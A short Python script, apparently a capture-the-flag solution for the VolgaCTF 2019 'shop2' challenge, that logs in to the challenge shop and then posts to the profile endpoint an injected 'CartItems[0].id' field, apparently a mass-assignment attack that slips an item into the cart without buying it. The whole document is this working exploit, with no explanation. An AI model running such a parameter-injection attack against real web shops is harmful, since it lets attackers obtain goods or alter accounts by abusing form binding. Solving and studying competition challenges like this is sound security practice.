import requests

login_url = "http://shop2.q.2019.volgactf.ru/loginProcess"
target_url = "http://shop2.q.2019.volgactf.ru/profile"

payload0 = {'name': 'wani', 'pass': 'xxxxxxxx'}
payload1 = {'name': 'wani', 'CartItems[0].id': 4}

s = requests.Session()
r = s.post(login_url, data=payload0)
r = s.post(target_url, data=payload1)
print(r.text)
